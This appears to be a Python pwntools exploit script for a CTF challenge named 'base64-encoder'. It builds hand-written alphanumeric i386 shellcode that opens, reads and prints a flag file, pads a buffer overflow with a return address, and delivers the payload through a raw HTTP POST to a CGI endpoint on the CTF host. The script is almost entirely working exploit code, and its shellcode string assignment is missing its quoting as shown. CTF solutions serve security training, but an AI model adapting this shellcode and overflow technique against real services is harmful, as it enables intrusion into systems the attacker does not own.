#pwn/base64 is shellcoding in base64 code.
from pwn import *
import requests

context.log_level = 'debug'
context.arch = 'i386'

sh = 
/* put flag string in memroy */
pop eax
pop eax
pop eax
pop eax
xor eax, 0x304f3030
push eax
pop eax
pop eax
xor eax, 0x30303030
push eax

/* sys_open */

pop eax
pop eax
xor eax, 0x58585858
push eax
pop ecx
push eax
pop edx

pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax

push 0x454d454d
pop eax
xor eax, 0x454d454d
dec eax
xor eax, 0x39394f65
xor eax, 0x56563057
push eax

push 0x454d454d
pop eax
xor eax, 0x454d4548

/* nop */

inc ebp
dec ebp
popad /* nop */
popad /* nop */
popad /* nop */
popad /* nop */
popad /* nop */
popad /* nop */
popad /* nop */
popad /* nop */

/* sys_read */

pop eax

push ebx    /* eax */
push ebx    /* ecx */
push ecx    /* edx */
push ecx    /* ebx */
push eax    /* skip esp */
push eax    /* ebp */
push ecx    /* esi */
push ecx    /* edi */

popad

inc ebx
inc ebx
inc ebx

xor eax, 0x77777134
push eax
pop edx

pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax

push ebp
push 0x33
pop eax
xor al, 0x30

/* nop */
push 0x454d454d /* nop */
pop eax /* nop */
xor eax, 0x454d454b /* nop and dec ebx */
dec ebx
pop eax

/* sys_write */
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
pop eax
inc ebx
push ebx
pop eax
dec ebx
dec ebx
dec ebx
push ebp

inc ebp
dec ebp
inc ebp
dec ebp
inc ebp
dec ebp
inc ebp
dec ebp
inc ebp
dec ebp
inc ebp
dec ebp
inc ebp
dec ebp
inc ebp
dec ebp


flagstr = '/home/pwn/flQWaDHD00'
prefix = 'A'*(0x30) + p32(0x77777034+len(flagstr)) + flagstr

key = str(prefix+ asm(sh))
buf = '\xe1\x96\x18' * 0x100
data = 'cmd={}&key={}&buf={}'.format('encode', key, buf)
p = '''POST /cgi-bin/chall HTTP/1.1
Host: base64-encoder.ctf.defenit.kr
Content-Length: {}
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.5
Referer: http://192.168.0.5/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,ja;q=0.8,zh-CN;q=0.7,zh-TW;q=0.6,zh;q=0.5
Connection: close

{}'''.format(len(data), data).replace('\n', '\r\n')
r = remote('base64-encoder.ctf.defenit.kr', 80)
r.send(p)

print r.recv()
